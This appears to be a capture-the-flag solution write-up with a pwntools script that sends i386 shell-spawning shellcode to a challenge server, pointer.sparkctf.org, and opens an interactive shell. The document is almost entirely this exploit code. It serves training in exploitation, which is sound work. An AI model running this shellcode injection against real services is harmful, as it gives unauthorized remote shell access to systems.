# Solution

1. Need to do some form of socket programming. Following code requires pwntools to be installed:
```py
from pwn import *

context.update(arch='i386',os='linux')

server_ip = "pointer.sparkctf.org" #change this to the server IP address hosting the binary.
con = remote(server_ip,6067)
data = asm(shellcraft.sh())
con.sendline(data)

con.interactive()
```